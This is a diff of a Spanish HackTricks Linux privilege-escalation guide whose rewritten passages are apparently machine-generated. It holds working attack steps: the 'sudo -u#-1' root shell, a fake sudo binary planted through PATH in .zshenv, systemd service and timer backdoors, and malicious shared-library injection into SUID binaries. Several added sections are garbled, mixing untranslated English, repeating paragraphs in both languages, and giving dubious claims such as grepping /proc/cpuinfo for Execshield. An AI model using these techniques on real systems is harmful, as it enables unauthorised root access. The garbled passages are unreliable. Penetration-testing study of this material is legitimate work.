@@ -7,7 +7,7 @@
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
@@ -45,7 +45,7 @@ searchsploit "Linux Kernel"
 Puedes encontrar una buena lista de kernels vulnerables y algunos **exploits ya compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
 Otros sitios donde puedes encontrar algunos **exploits ya compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-Para extraer todas las versiones de kernel vulnerables de esa página web, puedes hacer lo siguiente:
+Para extraer todas las versiones de kernel vulnerables de esa web, puedes hacer lo siguiente:
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
@@ -77,19 +77,23 @@ Puedes verificar si la versión de sudo es vulnerable utilizando este comando gr
 ```bash
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
-### sudo < v1.28
+#### sudo < v1.28
 
 De @sickrov
 
 ---
 
-La versión de sudo anterior a la 1.28 presenta una vulnerabilidad de escalada de privilegios que puede ser explotada por un atacante para obtener acceso de root en un sistema Linux. Esta vulnerabilidad se debe a un error en la forma en que sudo maneja ciertos comandos y argumentos.
+El comando `sudo` es una herramienta comúnmente utilizada en sistemas Linux para permitir a los usuarios ejecutar comandos con privilegios de superusuario. Sin embargo, en versiones anteriores a la 1.28 de `sudo`, existe una vulnerabilidad que puede ser explotada para obtener privilegios de root de forma no autorizada.
 
-Un atacante puede aprovechar esta vulnerabilidad al proporcionar argumentos especialmente diseñados a un comando sudo permitido. Estos argumentos pueden permitir al atacante ejecutar comandos con privilegios de root, incluso si no tienen los permisos necesarios.
+Esta vulnerabilidad se debe a un error en la forma en que `sudo` maneja las entradas de línea de comandos. Un atacante puede aprovechar esta vulnerabilidad para ejecutar comandos arbitrarios con privilegios de root, incluso si no tiene los permisos necesarios.
 
-Para mitigar esta vulnerabilidad, se recomienda actualizar sudo a la versión 1.28 o posterior. Esto se puede hacer a través de la actualización del sistema operativo o mediante la instalación de una versión actualizada de sudo desde la fuente oficial.
+Para explotar esta vulnerabilidad, el atacante debe tener acceso a una cuenta de usuario con el permiso de ejecutar `sudo`. A continuación, puede utilizar una técnica conocida como "inyección de argumentos" para manipular las opciones de línea de comandos y ejecutar comandos maliciosos.
 
-Es importante tener en cuenta que esta vulnerabilidad solo afecta a las versiones anteriores a la 1.28 de sudo. Si ya está utilizando una versión más reciente, no es necesario tomar ninguna acción adicional.
+La mejor manera de protegerse contra esta vulnerabilidad es actualizar `sudo` a una versión posterior a la 1.28. Esto se puede hacer mediante la instalación de las actualizaciones de seguridad más recientes para su distribución de Linux.
+
+Si no es posible actualizar `sudo` a una versión más reciente, se recomienda restringir el acceso a `sudo` solo a los usuarios que realmente lo necesiten. Esto puede hacerse mediante la configuración adecuada de los archivos de configuración de `sudo` y la asignación de permisos de manera restrictiva.
+
+Es importante tener en cuenta que esta vulnerabilidad solo afecta a las versiones anteriores a la 1.28 de `sudo`. Si está utilizando una versión más reciente, no es necesario tomar ninguna medida adicional para protegerse contra esta vulnerabilidad.
 ```
 sudo -u#-1 /bin/bash
 ```
@@ -101,9 +105,9 @@ dmesg 2>/dev/null | grep "signature"
 ```
 ### Más enumeración del sistema
 
-Once you have gained initial access to a system, it is important to perform thorough enumeration to gather as much information as possible about the target. This will help you identify potential vulnerabilities and escalate privileges.
+Once you have gained initial access to a system, it is important to gather as much information as possible about the target system. This will help you identify potential vulnerabilities and escalate your privileges.
 
-A continuación se presentan algunas técnicas adicionales de enumeración del sistema que pueden ser útiles:
+A continuación se presentan algunas técnicas de enumeración adicionales que pueden ser útiles:
 
 #### Enumeración de usuarios y grupos
 
@@ -115,16 +119,16 @@ A continuación se presentan algunas técnicas adicionales de enumeración del s
 - **netstat**: Esta herramienta muestra las conexiones de red activas, los puertos abiertos y los servicios que se están ejecutando en el sistema.
 - **lsof**: Esta herramienta muestra los archivos abiertos por los procesos en ejecución, lo que puede ayudar a identificar servicios y puertos en uso.
 
-#### Enumeración de procesos
-
-- **ps**: Esta herramienta muestra los procesos en ejecución en el sistema, incluyendo su identificador de proceso (PID), propietario y otros detalles relevantes.
-
 #### Enumeración de archivos y directorios
 
-- **ls**: Esta herramienta muestra los archivos y directorios en un directorio específico, lo que puede ayudar a identificar archivos sensibles o configuraciones mal configuradas.
-- **find**: Esta herramienta permite buscar archivos y directorios en todo el sistema en función de diferentes criterios, como nombre, tamaño o fecha de modificación.
+- **find**: Esta herramienta permite buscar archivos y directorios en el sistema en función de diferentes criterios, como el nombre, el tamaño y los permisos.
+- **ls**: Esta herramienta muestra el contenido de un directorio, incluidos los archivos y subdirectorios.
 
-Recuerda que la enumeración del sistema es un paso crucial en el proceso de hacking ético, ya que te proporciona información valiosa para identificar posibles puntos débiles y escalar privilegios.
+#### Enumeración de procesos
+
+- **ps**: Esta herramienta muestra los procesos en ejecución en el sistema, incluidos sus identificadores de proceso (PID) y otros detalles relevantes.
+
+Recuerda que la enumeración del sistema es un paso crucial en el proceso de hacking ético, ya que te proporciona información valiosa para identificar posibles puntos débiles y aumentar tus privilegios en el sistema objetivo.
 ```bash
 date 2>/dev/null #Date
 (df -h || lsblk) #System stats
@@ -145,19 +149,19 @@ fi
 ```
 ### Grsecurity
 
-Grsecurity es un conjunto de parches de seguridad para el kernel de Linux que proporciona una protección adicional contra ataques de escalada de privilegios. Estos parches implementan medidas de seguridad avanzadas, como la protección de memoria, la restricción de capacidades y la auditoría del sistema.
+Grsecurity es un conjunto de parches de seguridad para el kernel de Linux que proporciona una protección adicional contra ataques de escalada de privilegios. Estos parches implementan medidas de seguridad avanzadas, como la protección de memoria, la restricción de capacidades y la auditoría de seguridad.
 
 La protección de memoria de Grsecurity ayuda a prevenir ataques de desbordamiento de búfer y ejecución de código arbitrario al aplicar políticas de acceso estrictas a la memoria del sistema. Esto evita que los atacantes puedan modificar o corromper áreas de memoria críticas.
 
 La restricción de capacidades limita los privilegios de los procesos, lo que significa que incluso si un atacante logra comprometer un proceso, no podrá realizar acciones maliciosas que estén fuera de su nivel de privilegio.
 
-La auditoría del sistema registra eventos de seguridad importantes, como intentos de acceso no autorizado o modificaciones en archivos críticos del sistema. Esto permite a los administradores de sistemas detectar y responder rápidamente a posibles amenazas.
+La auditoría de seguridad registra eventos y actividades sospechosas en el sistema, lo que permite a los administradores detectar y responder rápidamente a posibles ataques.
 
-En resumen, Grsecurity es una herramienta poderosa para fortalecer la seguridad de los sistemas Linux al proporcionar protección adicional contra ataques de escalada de privilegios.
+Grsecurity es una herramienta poderosa para fortalecer la seguridad de un sistema Linux y protegerlo contra ataques de escalada de privilegios. Sin embargo, es importante tener en cuenta que la instalación y configuración de Grsecurity requiere un conocimiento avanzado del sistema operativo y puede tener impacto en la compatibilidad con ciertos programas y funcionalidades.
 ```bash
 ((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
 ```
-PaX es una característica de seguridad que se utiliza para proteger el sistema operativo Linux contra ataques de escalada de privilegios. PaX implementa diferentes técnicas de mitigación, como la aleatorización de direcciones de memoria (ASLR), la protección de ejecución (NX) y la protección de escritura (W^X). Estas técnicas ayudan a prevenir la ejecución de código malicioso y a proteger el sistema contra vulnerabilidades conocidas. PaX se puede habilitar en el kernel de Linux utilizando herramientas como Grsecurity o PaXctl. Al implementar PaX, se fortalece la seguridad del sistema y se reduce la posibilidad de que un atacante pueda obtener privilegios elevados.
+PaX es una característica de seguridad que se utiliza para proteger el sistema operativo Linux contra ataques de escalada de privilegios. PaX implementa diferentes técnicas, como la aleatorización de direcciones de memoria (ASLR), la protección de ejecución (NX) y la protección de escritura (W^X), para dificultar la explotación de vulnerabilidades en el kernel de Linux. Estas técnicas ayudan a prevenir la ejecución de código malicioso y a limitar los privilegios de los procesos, lo que hace que sea más difícil para un atacante obtener acceso no autorizado al sistema. PaX es una herramienta útil para fortalecer la seguridad de un sistema Linux y reducir el riesgo de escalada de privilegios.
 ```bash
 (which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
 ```
@@ -165,11 +169,17 @@ PaX es una característica de seguridad que se utiliza para proteger el sistema 
 
 Execshield es una característica de seguridad implementada en el kernel de Linux que ayuda a proteger contra ataques de desbordamiento de búfer y ejecución de código malicioso. Esta característica utiliza técnicas como la aleatorización de direcciones de pila y la protección de la memoria para dificultar la explotación de vulnerabilidades en el sistema.
 
-La aleatorización de direcciones de pila implica cambiar la ubicación de la pila en la memoria cada vez que se ejecuta un programa, lo que dificulta que un atacante pueda predecir la ubicación exacta de la pila y sobrescribirla con código malicioso.
+La aleatorización de direcciones de pila impide que un atacante pueda predecir la ubicación exacta de la pila en la memoria, lo que dificulta la ejecución de un ataque de desbordamiento de búfer. La protección de la memoria, por otro lado, ayuda a prevenir la ejecución de código malicioso en áreas de memoria no autorizadas.
 
-La protección de la memoria implica marcar ciertas áreas de memoria como no ejecutables, lo que evita que el código malicioso se ejecute en esas áreas. Esto ayuda a prevenir ataques de desbordamiento de búfer, donde un atacante intenta sobrescribir áreas de memoria con código malicioso.
+Para habilitar Execshield en un sistema Linux, se pueden seguir los siguientes pasos:
 
-En resumen, Execshield es una característica de seguridad importante que ayuda a proteger contra ataques de desbordamiento de búfer y ejecución de código malicioso en sistemas Linux.
+1. Verificar si el kernel del sistema tiene soporte para Execshield. Esto se puede hacer ejecutando el comando `cat /proc/cpuinfo | grep execshield`. Si no se muestra ninguna salida, significa que el kernel no tiene soporte para Execshield.
+
+2. Si el kernel tiene soporte para Execshield, se puede habilitar agregando el parámetro `exec-shield` al archivo de configuración del gestor de arranque. Por ejemplo, en sistemas que utilizan GRUB como gestor de arranque, se puede editar el archivo `/etc/default/grub` y agregar `exec-shield=1` al valor de la variable `GRUB_CMDLINE_LINUX`. Luego, se debe ejecutar el comando `update-grub` para aplicar los cambios.
+
+3. Reiniciar el sistema para que los cambios surtan efecto.
+
+Es importante tener en cuenta que Execshield es solo una de las muchas medidas de seguridad que se pueden implementar en un sistema Linux. Es recomendable utilizar otras técnicas de endurecimiento y seguir buenas prácticas de seguridad para garantizar la protección adecuada del sistema.
 ```bash
 (grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
 ```
@@ -177,16 +187,9 @@ En resumen, Execshield es una característica de seguridad importante que ayuda 
 
 SElinux (Security-Enhanced Linux) es un mecanismo de seguridad implementado en el kernel de Linux que proporciona un control granular sobre los permisos de acceso de los procesos y archivos del sistema. SElinux utiliza políticas de seguridad para restringir las acciones que pueden realizar los procesos y limitar el acceso a los recursos del sistema.
 
-En el contexto de la escalada de privilegios, SElinux puede ser utilizado para mitigar o prevenir ataques al restringir los permisos de los procesos y limitar su capacidad para elevar sus privilegios. Al configurar adecuadamente las políticas de SElinux, se puede reducir la superficie de ataque y fortalecer la seguridad del sistema.
+En el contexto de la escalada de privilegios, SElinux puede ser utilizado para mitigar o prevenir ataques al restringir los permisos de los procesos y archivos involucrados en el ataque. Al configurar adecuadamente las políticas de SElinux, se puede limitar la capacidad de un atacante para elevar sus privilegios y acceder a recursos sensibles del sistema.
 
-Algunas medidas que se pueden tomar para fortalecer la seguridad utilizando SElinux incluyen:
-
-- Configurar políticas de SElinux para restringir los permisos de los procesos y archivos sensibles.
-- Utilizar el modo de ejecución restringido de SElinux para limitar las acciones que pueden realizar los procesos.
-- Configurar políticas de SElinux para limitar el acceso a recursos críticos del sistema.
-- Monitorear los registros de auditoría de SElinux para detectar posibles intentos de escalada de privilegios.
-
-En resumen, SElinux es una herramienta poderosa para fortalecer la seguridad de un sistema Linux al proporcionar un control granular sobre los permisos de acceso de los procesos y archivos. Al configurar adecuadamente las políticas de SElinux, se puede mitigar o prevenir la escalada de privilegios y mejorar la seguridad general del sistema.
+Es importante tener en cuenta que la configuración de SElinux puede ser compleja y requiere un conocimiento profundo del sistema operativo y de las políticas de seguridad. Sin embargo, su implementación puede proporcionar una capa adicional de protección contra ataques de escalada de privilegios.
 ```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
 ```
@@ -272,7 +275,7 @@ El archivo _**/proc/sys/kernel/yama/ptrace\_scope**_ controla la accesibilidad d
 
 * **kernel.yama.ptrace\_scope = 0**: todos los procesos pueden ser depurados, siempre y cuando tengan el mismo uid. Esta es la forma clásica en que funcionaba ptrace.
 * **kernel.yama.ptrace\_scope = 1**: solo se puede depurar un proceso padre.
-* **kernel.yama.ptrace\_scope = 2**: solo el administrador puede usar ptrace, ya que requiere la capacidad CAP\_SYS\_PTRACE.
+* **kernel.yama.ptrace\_scope = 2**: solo el administrador puede usar ptrace, ya que se requiere la capacidad CAP\_SYS\_PTRACE.
 * **kernel.yama.ptrace\_scope = 3**: no se pueden rastrear procesos con ptrace. Una vez establecido, se necesita reiniciar para habilitar ptrace nuevamente.
 {% endhint %}
 
@@ -469,7 +472,7 @@ Es posible crear un trabajo cron **colocando un retorno de carro después de un 
 
 ### Archivos _.service_ con permisos de escritura
 
-Verifica si puedes escribir algún archivo `.service`, si puedes, **podrías modificarlo** para que **ejecute** tu **puerta trasera cuando** el servicio se **inicie**, **reinicie** o **detenga** (tal vez necesites esperar hasta que la máquina se reinicie).\
+Verifica si puedes escribir algún archivo `.service`, si puedes, **podrías modificarlo** para que **ejecute** tu **puerta trasera cuando** el servicio se **inicie**, **reinicie** o **detenga** (tal vez debas esperar hasta que la máquina se reinicie).\
 Por ejemplo, crea tu puerta trasera dentro del archivo .service con **`ExecStart=/tmp/script.sh`**
 
 ### Binarios de servicio con permisos de escritura
@@ -508,7 +511,7 @@ Unit=backdoor.service
 ```
 En la documentación se puede leer qué es una Unidad:
 
-> La unidad que se activará cuando este temporizador se agote. El argumento es el nombre de una unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor se establece por defecto en un servicio que tiene el mismo nombre que la unidad del temporizador, excepto por el sufijo. (Ver arriba). Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador sean idénticos, excepto por el sufijo.
+> La unidad que se activará cuando este temporizador expire. El argumento es el nombre de una unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor se establece por defecto en un servicio que tiene el mismo nombre que la unidad del temporizador, excepto por el sufijo. (Ver arriba). Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador sean idénticos, excepto por el sufijo.
 
 Por lo tanto, para abusar de este permiso necesitarías:
 
@@ -555,17 +558,21 @@ netstat -a -p --unix
 ```
 ### Conexión en bruto
 
-When performing a penetration test, it is common to gain initial access to a target system with limited privileges. However, the ultimate goal is to escalate those privileges and gain full control over the system. One technique that can be used for privilege escalation is a raw connection.
+A raw connection refers to a direct connection between two network devices without any additional protocols or encryption. This type of connection allows for low-level access to the network and can be useful for various purposes, including privilege escalation during a penetration test.
 
-A raw connection involves establishing a direct connection to a service or application running on the target system, bypassing any authentication or security measures in place. This can be achieved by exploiting vulnerabilities in the target system or by leveraging misconfigurations.
+To establish a raw connection, you can use tools like netcat or socat. These tools allow you to create a socket connection and interact with the remote device using standard input and output.
 
-Once a raw connection is established, an attacker can interact directly with the service or application, potentially gaining access to sensitive information or executing commands with elevated privileges. This can be particularly useful when targeting services or applications that have known vulnerabilities or weak security controls.
+Here is an example of how to establish a raw connection using netcat:
 
-It is important to note that attempting to establish a raw connection without proper authorization is illegal and unethical. Raw connections should only be used in the context of authorized penetration testing or security assessments.
+```bash
+nc <target_ip> <port>
+```
 
-To protect against raw connection attacks, it is crucial to implement strong security measures such as regular patching and updates, proper configuration of services and applications, and the use of strong authentication mechanisms. Additionally, monitoring and logging should be in place to detect and respond to any suspicious activity.
+Replace `<target_ip>` with the IP address of the target device and `<port>` with the desired port number.
 
-By understanding the concept of raw connections and the potential risks they pose, security professionals can better defend against privilege escalation attacks and ensure the integrity and confidentiality of their systems.
+Once the connection is established, you can send and receive data directly through the socket. This can be particularly useful for exploiting vulnerabilities or performing privilege escalation techniques.
+
+It is important to note that raw connections do not provide any encryption or authentication, making them vulnerable to interception and unauthorized access. Therefore, it is crucial to use them responsibly and only in controlled environments during authorized penetration testing activities.
 ```bash
 #apt-get install netcat-openbsd
 nc -U /tmp/socket  #Connect to UNIX-domain stream socket
@@ -776,19 +783,14 @@ fi
 
 A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key points to consider when implementing a password policy:
 
-- **Password Complexity**: Require passwords to be a combination of uppercase and lowercase letters, numbers, and special characters. This makes it harder for attackers to guess or crack passwords.
+- **Password Length**: Require passwords to be a minimum length, typically at least 8 characters. Longer passwords are generally more secure.
+- **Complexity**: Encourage the use of complex passwords that include a combination of uppercase and lowercase letters, numbers, and special characters.
+- **Password Expiration**: Set a policy that requires users to change their passwords periodically, such as every 90 days. This helps prevent the use of compromised passwords.
+- **Password History**: Implement a password history feature that prevents users from reusing their previous passwords. This ensures that users choose new and unique passwords each time.
+- **Account Lockout**: Implement an account lockout policy that temporarily locks user accounts after a certain number of failed login attempts. This helps protect against brute-force attacks.
+- **Two-Factor Authentication**: Consider implementing two-factor authentication (2FA) to provide an additional layer of security. This requires users to provide a second form of verification, such as a code sent to their mobile device, in addition to their password.
 
-- **Password Length**: Set a minimum password length to ensure that passwords are not easily guessable. A longer password is generally more secure.
-
-- **Password Expiration**: Enforce regular password changes to reduce the risk of compromised passwords. Users should be prompted to change their passwords after a certain period of time.
-
-- **Password History**: Maintain a password history to prevent users from reusing old passwords. This ensures that users choose new and unique passwords each time.
-
-- **Account Lockout**: Implement an account lockout policy to protect against brute-force attacks. After a certain number of failed login attempts, the account should be locked for a specified period of time.
-
-- **Two-Factor Authentication**: Consider implementing two-factor authentication (2FA) to add an extra layer of security. This requires users to provide a second form of verification, such as a code sent to their mobile device, in addition to their password.
-
-By implementing a strong password policy, you can significantly enhance the security of your system and protect against unauthorized access.
+By implementing a strong password policy, you can significantly enhance the security of your system and reduce the risk of unauthorized access.
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
@@ -798,7 +800,7 @@ Si **conoces alguna contraseña** del entorno, intenta iniciar sesión como cada
 
 ### Su Brute
 
-Si no te importa hacer mucho ruido y los binarios `su` y `timeout` están presentes en la computadora, puedes intentar forzar el acceso de usuario utilizando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+Si no te importa hacer mucho ruido y los binarios `su` y `timeout` están presentes en la computadora, puedes intentar forzar el acceso de usuarios utilizando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta forzar el acceso de usuarios.
 
 ## Abusos de PATH con permisos de escritura
@@ -945,7 +947,7 @@ sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
 ### Binario SUID - Inyección de .so
 
-Si encuentras algún binario extraño con permisos **SUID**, puedes verificar si todos los archivos **.so** se están **cargando correctamente**. Para hacerlo, puedes ejecutar:
+Si encuentras un binario extraño con permisos **SUID**, puedes verificar si todos los archivos **.so** se están **cargando correctamente**. Para hacerlo, puedes ejecutar:
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
@@ -968,35 +970,49 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 ```
 ## Secuestro de Objetos Compartidos
 
-El secuestro de objetos compartidos es una técnica de escalada de privilegios que aprovecha la forma en que los sistemas operativos buscan y cargan bibliotecas compartidas. Esta técnica se basa en reemplazar una biblioteca compartida legítima con una versión maliciosa que contiene código malicioso.
+Shared Object Hijacking, also known as DLL hijacking, is a privilege escalation technique that allows an attacker to execute arbitrary code with elevated privileges by exploiting the way an application loads shared libraries.
 
-### Descripción
+El Secuestro de Objetos Compartidos, también conocido como DLL hijacking, es una técnica de escalada de privilegios que permite a un atacante ejecutar código arbitrario con privilegios elevados al explotar la forma en que una aplicación carga bibliotecas compartidas.
 
-Cuando un programa se ejecuta, el sistema operativo busca las bibliotecas compartidas necesarias para su funcionamiento. Por lo general, el sistema busca estas bibliotecas en ubicaciones predefinidas, como `/lib` o `/usr/lib`. Sin embargo, también puede buscar en otros directorios, como el directorio actual del programa.
+### How it works
 
-Un atacante puede aprovechar esto colocando una biblioteca maliciosa en un directorio en el que el programa tenga permisos de escritura y que esté antes en la lista de búsqueda que el directorio donde se encuentra la biblioteca legítima. Cuando el programa se ejecuta, el sistema cargará la biblioteca maliciosa en lugar de la legítima, lo que permitirá al atacante ejecutar código malicioso con los privilegios del programa.
+### Cómo funciona
 
-### Ejemplo
+When an application is designed to load a shared library, it usually searches for the library in a specific order. If the library is not found in the expected location, the application may search in other directories or use a default library with the same name.
 
-Supongamos que un programa llamado `app` busca la biblioteca `libexample.so` en el directorio actual antes de buscarla en `/usr/lib`. Un atacante puede colocar una biblioteca maliciosa llamada `libexample.so` en el directorio actual y aprovecharse de esto.
+Cuando una aplicación está diseñada para cargar una biblioteca compartida, generalmente busca la biblioteca en un orden específico. Si la biblioteca no se encuentra en la ubicación esperada, la aplicación puede buscar en otros directorios o utilizar una biblioteca predeterminada con el mismo nombre.
 
-El atacante puede compilar un código malicioso en un archivo `libexample.c` y generar una biblioteca compartida maliciosa `libexample.so` con el siguiente comando:
+An attacker can take advantage of this behavior by placing a malicious shared library with the same name as the expected library in a directory that is searched before the legitimate one. When the application attempts to load the library, it will unknowingly load the attacker's library instead, allowing the attacker to execute arbitrary code with the privileges of the application.
 
-```bash
-gcc -shared -o libexample.so libexample.c
-```
+Un atacante puede aprovechar este comportamiento colocando una biblioteca compartida maliciosa con el mismo nombre que la biblioteca esperada en un directorio que se busca antes que el legítimo. Cuando la aplicación intenta cargar la biblioteca, cargará sin saberlo la biblioteca del atacante en su lugar, lo que permite al atacante ejecutar código arbitrario con los privilegios de la aplicación.
 
-Luego, el atacante puede ejecutar el programa `app` desde el mismo directorio y el sistema cargará la biblioteca maliciosa en lugar de la legítima. Esto permitirá al atacante ejecutar código malicioso con los privilegios del programa `app`.
+### Mitigation
 
 ### Mitigación
 
-Para mitigar el secuestro de objetos compartidos, se recomienda seguir las siguientes prácticas:
+To mitigate shared object hijacking attacks, it is recommended to follow these best practices:
 
-- Evitar colocar bibliotecas compartidas en directorios en los que los usuarios no tengan permisos de escritura.
-- Utilizar rutas absolutas al cargar bibliotecas compartidas en lugar de rutas relativas.
-- Configurar correctamente las variables de entorno relacionadas con la carga de bibliotecas compartidas, como `LD_LIBRARY_PATH`, para evitar que se carguen bibliotecas maliciosas.
+Para mitigar los ataques de secuestro de objetos compartidos, se recomienda seguir estas mejores prácticas:
 
-Además, es importante mantener el sistema operativo y las bibliotecas actualizadas para asegurarse de que se hayan corregido posibles vulnerabilidades que podrían ser explotadas mediante el secuestro de objetos compartidos.
+- Use absolute paths when loading shared libraries to ensure that the correct library is loaded.
+
+- Utilice rutas absolutas al cargar bibliotecas compartidas para asegurarse de que se cargue la biblioteca correcta.
+
+- Avoid using default library names, as they are more likely to be targeted by attackers.
+
+- Evite utilizar nombres de bibliotecas predeterminados, ya que es más probable que sean objetivo de los atacantes.
+
+- Regularly update the application and its dependencies to ensure that any known vulnerabilities are patched.
+
+- Actualice regularmente la aplicación y sus dependencias para asegurarse de que se corrijan las vulnerabilidades conocidas.
+
+- Implement strong access controls and privilege separation to limit the impact of a successful attack.
+
+- Implemente controles de acceso sólidos y separación de privilegios para limitar el impacto de un ataque exitoso.
+
+By following these measures, the risk of shared object hijacking can be significantly reduced.
+
+Al seguir estas medidas, se puede reducir significativamente el riesgo de secuestro de objetos compartidos.
 ```bash
 # Lets find a SUID using a non-standard library
 ldd some_suid
@@ -1006,7 +1022,7 @@ something.so => /lib/x86_64-linux-gnu/something.so
 readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
-Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta donde podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
+Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta en la que podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
 #include <stdio.h>
@@ -1085,7 +1101,7 @@ Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y t
 ### /etc/sudoers, /etc/sudoers.d
 
 El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos, por defecto, solo pueden ser leídos por el usuario root y el grupo root.\
-Si puedes leer este archivo, podrías ser capaz de obtener información interesante, y si puedes escribir en cualquier archivo, podrás elevar tus privilegios.
+Si puedes leer este archivo, podrías obtener información interesante, y si puedes escribir en cualquier archivo, podrás elevar tus privilegios.
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
@@ -1110,19 +1126,34 @@ permit nopass demo as root cmd vim
 ```
 ### Secuestro de Sudo
 
-Si sabes que un **usuario suele conectarse a una máquina y usar `sudo`** para elevar los privilegios y tienes una shell dentro del contexto de ese usuario, puedes **crear un nuevo ejecutable de sudo** que ejecutará tu código como root y luego el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo, agregando la nueva ruta en .bash\_profile) para que cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.
+Si sabes que un **usuario suele conectarse a una máquina y utiliza `sudo`** para elevar los privilegios y tienes una shell dentro del contexto de ese usuario, puedes **crear un nuevo ejecutable de sudo** que ejecutará tu código como root y luego el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo, agregando la nueva ruta en .bash\_profile) para que cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.
 
 Ten en cuenta que si el usuario utiliza un shell diferente (no bash), deberás modificar otros archivos para agregar la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)
 
-## Biblioteca Compartida
+O ejecutando algo como:
+```bash
+cat >/tmp/sudo <<EOF
+#!/bin/bash
+/usr/bin/sudo whoami > /tmp/privesc
+/usr/bin/sudo "\$@"
+EOF
+chmod +x /tmp/sudo
+echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other
+
+# From the victim
+zsh
+echo $PATH
+sudo ls
+```
+## Biblioteca compartida
 
 ### ld.so
 
 El archivo `/etc/ld.so.conf` indica **de dónde se cargan los archivos de configuración**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`
 
-Esto significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se buscarán **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.
+Esto significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se buscarán las **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.
 
